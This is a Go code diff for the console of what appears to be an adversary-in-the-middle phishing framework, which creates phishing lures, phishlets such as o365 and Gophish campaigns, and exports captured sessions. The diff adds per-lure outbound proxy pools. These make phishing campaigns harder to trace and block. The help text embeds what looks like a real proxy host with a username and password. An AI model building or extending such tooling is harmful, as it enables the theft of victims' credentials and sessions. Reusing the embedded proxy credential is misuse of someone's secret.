@@ -2686,6 +2686,140 @@ func (t *Terminal) handleLures(args []string) error {
 			} else {
 				return fmt.Errorf("incorrect number of arguments")
 			}
+		case "proxy_pool":
+			if pn < 3 {
+				return fmt.Errorf("incorrect number of arguments")
+			}
+			l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
+			if err != nil {
+				return fmt.Errorf("proxy_pool: %v", err)
+			}
+			l, err := t.cfg.GetLure(l_id)
+			if err != nil {
+				return fmt.Errorf("proxy_pool: %v", err)
+			}
+
+			switch args[2] {
+			case "add":
+				var pc *ProxyConfig
+				var err error
+
+				// Flexible syntax:
+				//   lures proxy_pool <id> add <proxy-string>
+				//   lures proxy_pool <id> add <type> <proxy-string>
+				//   lures proxy_pool <id> add <type> <address> <port> [username] [password]
+				//
+				// <proxy-string> format: [type://]host:port[:username[:password]]
+				if pn == 4 {
+					pc, err = ParseProxyPoolString(args[3])
+					if err != nil {
+						return fmt.Errorf("proxy_pool: %v", err)
+					}
+				} else if pn == 5 && strings.Contains(args[4], ":") {
+					pc, err = ParseProxyPoolString(args[4])
+					if err != nil {
+						return fmt.Errorf("proxy_pool: %v", err)
+					}
+					pc.Type = strings.ToLower(args[3])
+					if pc.Type != "http" && pc.Type != "https" && pc.Type != "socks5" && pc.Type != "socks5h" {
+						return fmt.Errorf("proxy_pool: unsupported proxy type: %s (use http, https, socks5, socks5h)", pc.Type)
+					}
+				} else if pn >= 6 {
+					pc = &ProxyConfig{Type: strings.ToLower(args[3]), Address: args[4], Enabled: true}
+					if pc.Type != "http" && pc.Type != "https" && pc.Type != "socks5" && pc.Type != "socks5h" {
+						return fmt.Errorf("proxy_pool: unsupported proxy type: %s (use http, https, socks5, socks5h)", pc.Type)
+					}
+					pc.Port, err = strconv.Atoi(args[5])
+					if err != nil || pc.Port <= 0 || pc.Port > 65535 {
+						return fmt.Errorf("proxy_pool: invalid port: %s", args[5])
+					}
+					if pn >= 7 {
+						pc.Username = args[6]
+					}
+					if pn >= 8 {
+						pc.Password = args[7]
+					}
+				} else {
+					return fmt.Errorf("usage: lures proxy_pool <id> add <[type://]host:port[:username[:password]]>\n       lures proxy_pool <id> add <type> <host:port[:username[:password]]>\n       lures proxy_pool <id> add <type> <address> <port> [username] [password]")
+				}
+
+				l.ProxyPool = append(l.ProxyPool, pc)
+				if err := t.cfg.SetLure(l_id, l); err != nil {
+					return fmt.Errorf("proxy_pool: %v", err)
+				}
+				log.Info("[%d] added proxy %s://%s:%d to lure pool", l_id, pc.Type, pc.Address, pc.Port)
+				return nil
+			case "remove":
+				if pn != 4 {
+					return fmt.Errorf("usage: lures proxy_pool <id> remove <index>")
+				}
+				idx, err := strconv.Atoi(args[3])
+				if err != nil {
+					return fmt.Errorf("proxy_pool: %v", err)
+				}
+				if idx < 0 || idx >= len(l.ProxyPool) {
+					return fmt.Errorf("proxy_pool: index out of bounds: %d", idx)
+				}
+				pc := l.ProxyPool[idx]
+				l.ProxyPool = append(l.ProxyPool[:idx], l.ProxyPool[idx+1:]...)
+				if err := t.cfg.SetLure(l_id, l); err != nil {
+					return fmt.Errorf("proxy_pool: %v", err)
+				}
+				log.Info("[%d] removed proxy %s://%s:%d from lure pool", l_id, pc.Type, pc.Address, pc.Port)
+				return nil
+			case "enable":
+				if pn != 4 {
+					return fmt.Errorf("usage: lures proxy_pool <id> enable <index>")
+				}
+				idx, err := strconv.Atoi(args[3])
+				if err != nil {
+					return fmt.Errorf("proxy_pool: %v", err)
+				}
+				if idx < 0 || idx >= len(l.ProxyPool) {
+					return fmt.Errorf("proxy_pool: index out of bounds: %d", idx)
+				}
+				l.ProxyPool[idx].Enabled = true
+				if err := t.cfg.SetLure(l_id, l); err != nil {
+					return fmt.Errorf("proxy_pool: %v", err)
+				}
+				log.Info("[%d] enabled proxy %d in lure pool", l_id, idx)
+				return nil
+			case "disable":
+				if pn != 4 {
+					return fmt.Errorf("usage: lures proxy_pool <id> disable <index>")
+				}
+				idx, err := strconv.Atoi(args[3])
+				if err != nil {
+					return fmt.Errorf("proxy_pool: %v", err)
+				}
+				if idx < 0 || idx >= len(l.ProxyPool) {
+					return fmt.Errorf("proxy_pool: index out of bounds: %d", idx)
+				}
+				l.ProxyPool[idx].Enabled = false
+				if err := t.cfg.SetLure(l_id, l); err != nil {
+					return fmt.Errorf("proxy_pool: %v", err)
+				}
+				log.Info("[%d] disabled proxy %d in lure pool", l_id, idx)
+				return nil
+			case "clear":
+				if pn != 3 {
+					return fmt.Errorf("usage: lures proxy_pool <id> clear")
+				}
+				l.ProxyPool = nil
+				if err := t.cfg.SetLure(l_id, l); err != nil {
+					return fmt.Errorf("proxy_pool: %v", err)
+				}
+				log.Info("[%d] cleared lure proxy pool", l_id)
+				return nil
+			case "list":
+				if pn != 3 {
+					return fmt.Errorf("usage: lures proxy_pool <id> list")
+				}
+				t.output("%s", t.sprintLureProxyPool(l))
+				return nil
+			default:
+				return fmt.Errorf("unknown proxy_pool subcommand: %s", args[2])
+			}
 		case "delete":
 			if pn == 2 {
 				if len(t.cfg.lures) == 0 {
@@ -2751,9 +2885,17 @@ func (t *Terminal) handleLures(args []string) error {
 
 			var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))
 
-			keys := []string{"phishlet", "hostname", "path", "redirector", "post_redirector", "ua_filter", "redirect_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url"}
-			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), white.Sprint(l.PostRedirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl)}
+			keys := []string{"phishlet", "hostname", "path", "redirector", "post_redirector", "ua_filter", "redirect_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url", "proxy_pool"}
+			proxyCount := "none"
+			if len(l.ProxyPool) > 0 {
+				proxyCount = fmt.Sprintf("%d proxy(s)", len(l.ProxyPool))
+			}
+			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), white.Sprint(l.PostRedirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl), cyan.Sprint(proxyCount)}
 			log.Printf("\n%s\n", AsRows(keys, vals))
+
+			if len(l.ProxyPool) > 0 {
+				t.output("%s", t.sprintLureProxyPool(l))
+			}
 
 			return nil
 		}
@@ -3396,10 +3538,11 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")
 	h.AddSubCommand("sessions", []string{"export"}, "export <id>", "export captured session data to a JSON file")
 
-	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all created lures and allows to edit or delete them.\nEach lure auto-creates a Gophish campaign named '<phishlet>-auto'\n(group/template/page/SMTP placeholders are auto-filled — review them\nin the Gophish admin UI at http://127.0.0.1:3333 before sending).\n\nQuickstart:\n  enable phishlet: phishlets enable <name>\n  use in campaign: lures create <phishlet>\n  print phish url: lures get-url <id>\n\nExamples:\n  lures create o365\n  lures get-url 0\n  lures get-url 0 firstname=John lastname=Doe\n  lures edit 0 redirect_url https://outlook.office.com/\n  lures pause 0 1d12h\n  lures unpause 0\n  lures delete 0\n  lures delete all", LAYER_TOP,
+	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all created lures and allows to edit or delete them.\nEach lure auto-creates a Gophish campaign named '<phishlet>-auto'\n(group/template/page/SMTP placeholders are auto-filled — review them\nin the Gophish admin UI at http://127.0.0.1:3333 before sending).\n\nQuickstart:\n  enable phishlet: phishlets enable <name>\n  use in campaign: lures create <phishlet>\n  print phish url: lures get-url <id>\n\nExamples:\n  lures create o365\n  lures get-url 0\n  lures get-url 0 firstname=John lastname=Doe\n  lures edit 0 redirect_url https://outlook.office.com/\n  lures proxy_pool 0 add http 1.2.3.4 8080 user pass\n  lures proxy_pool 0 add us.udealproxy.com:6666:userId-1688-custom-6468-region-jp:ZRzjrA\n  lures proxy_pool 0 add socks5 us.udealproxy.com:6666:userId-1688-custom-6468-region-jp:ZRzjrA\n  lures proxy_pool 0 list\n  lures proxy_pool 0 remove 0\n  lures pause 0 1d12h\n  lures unpause 0\n  lures delete 0\n  lures delete all", LAYER_TOP,
 		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
 			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)), readline.PcItem("post_redirector", readline.PcItemDynamic(t.postRedirectorsPrefixCompleter)))),
-			readline.PcItem("delete", readline.PcItem("all"))))
+			readline.PcItem("delete", readline.PcItem("all")),
+			readline.PcItem("proxy_pool", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("list"), readline.PcItem("clear")))))
 
 	h.AddSubCommand("lures", nil, "", "show all create lures")
 	h.AddSubCommand("lures", nil, "<id>", "show details of a lure with a given <id>")
@@ -3421,6 +3564,13 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"edit", "og_desc"}, "edit <id> og_des <title>", "sets opengraph description that will be shown in link preview, for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "og_image"}, "edit <id> og_image <title>", "sets opengraph image url that will be shown in link preview, for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "og_url"}, "edit <id> og_url <title>", "sets opengraph url that will be shown in link preview, for a lure with a given <id>")
+	h.AddSubCommand("lures", []string{"proxy_pool"}, "proxy_pool <id> <add|remove|enable|disable|list|clear>", "manage per-lure proxy pool for session-bound outbound proxies")
+	h.AddSubCommand("lures", []string{"proxy_pool", "add"}, "proxy_pool <id> add <[type://]host:port[:username[:password]]>", "add a proxy to the lure's proxy pool (types: http, https, socks5, socks5h)")
+	h.AddSubCommand("lures", []string{"proxy_pool", "remove"}, "proxy_pool <id> remove <index>", "remove proxy at <index> from the lure's proxy pool")
+	h.AddSubCommand("lures", []string{"proxy_pool", "enable"}, "proxy_pool <id> enable <index>", "enable proxy at <index> in the lure's proxy pool")
+	h.AddSubCommand("lures", []string{"proxy_pool", "disable"}, "proxy_pool <id> disable <index>", "disable proxy at <index> in the lure's proxy pool")
+	h.AddSubCommand("lures", []string{"proxy_pool", "list"}, "proxy_pool <id> list", "list all proxies in the lure's proxy pool")
+	h.AddSubCommand("lures", []string{"proxy_pool", "clear"}, "proxy_pool <id> clear", "remove all proxies from the lure's proxy pool")
 
 	h.AddCommand("domains", "general", "manage domain configuration and rotation", "Unified domain management: set base domain, manage domain pool, and\nconfigure domain rotation. When rotation is enabled, all configured\ndomains are automatically added to the rotation pool.\n\nQuickstart:\n  set domain:     domains set <domain>\n  add to pool:    domains add <domain>\n  enable:         domains enable <domain>\n  set primary:    domains set-primary <domain>\n  rotation:       domains rotation enable on", LAYER_TOP,
 		readline.PcItem("domains",
@@ -3745,6 +3895,39 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 	return AsTable(cols, rows)
 }
 
+func (t *Terminal) sprintLureProxyPool(l *Lure) string {
+	hiblue := color.New(color.FgHiBlue)
+	green := color.New(color.FgHiGreen)
+	red := color.New(color.FgHiRed)
+	white := color.New(color.FgHiWhite)
+
+	if len(l.ProxyPool) == 0 {
+		return "no proxies configured for this lure\n"
+	}
+
+	cols := []string{"idx", "type", "address", "port", "username", "enabled"}
+	var rows [][]string
+	for i, pc := range l.ProxyPool {
+		enabled := red.Sprint("no")
+		if pc.Enabled {
+			enabled = green.Sprint("yes")
+		}
+		username := "-"
+		if pc.Username != "" {
+			username = pc.Username
+		}
+		rows = append(rows, []string{
+			strconv.Itoa(i),
+			hiblue.Sprint(pc.Type),
+			white.Sprint(pc.Address),
+			strconv.Itoa(pc.Port),
+			username,
+			enabled,
+		})
+	}
+	return AsTable(cols, rows)
+}
+
 func (t *Terminal) sprintLures() string {
 	higreen := color.New(color.FgHiGreen)
 	hiblue := color.New(color.FgHiBlue)
@@ -3753,7 +3936,7 @@ func (t *Terminal) sprintLures() string {
 	hcyan := color.New(color.FgHiCyan)
 	white := color.New(color.FgHiWhite)
 	//n := 0
-	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "post_redirector", "redirect_url", "paused", "og"}
+	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "post_redirector", "redirect_url", "paused", "og", "proxies"}
 	var rows [][]string
 	for n, l := range t.cfg.lures {
 		var og string
@@ -3780,7 +3963,8 @@ func (t *Terminal) sprintLures() string {
 
 		var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))
 
-		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), white.Sprint(l.PostRedirector), yellow.Sprint(l.RedirectUrl), s_paused, og})
+		proxyCount := strconv.Itoa(len(l.ProxyPool))
+		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), white.Sprint(l.PostRedirector), yellow.Sprint(l.RedirectUrl), s_paused, og, proxyCount})
 	}
 	return AsTable(cols, rows)
 }
